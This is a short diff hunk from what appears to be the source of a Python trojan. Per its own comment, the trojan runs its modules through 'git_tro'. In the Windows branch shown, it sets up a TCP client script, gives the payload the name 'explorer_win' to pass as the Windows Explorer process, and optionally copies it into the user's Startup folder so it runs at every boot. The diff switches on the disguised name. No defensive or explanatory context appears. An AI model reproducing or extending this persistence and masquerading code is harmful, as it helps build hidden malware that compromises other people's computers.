@@ -47,7 +47,7 @@ def run(**args): # Must import its personal lib, git_tro will execute this modul
 	elif os.name == 'nt':
 		scriptPath = "scripts/TCP_client.py"
 		ScriptExec = "python"
-		#TargetScript = "explorer_win"
+		TargetScript = "explorer_win"
 		if winRunOnBoot == True:
 			TargetScript = os.getenv("APPDATA")+"\Microsoft\Windows\Start Menu\Programs\Startup\\explorer_win"
 
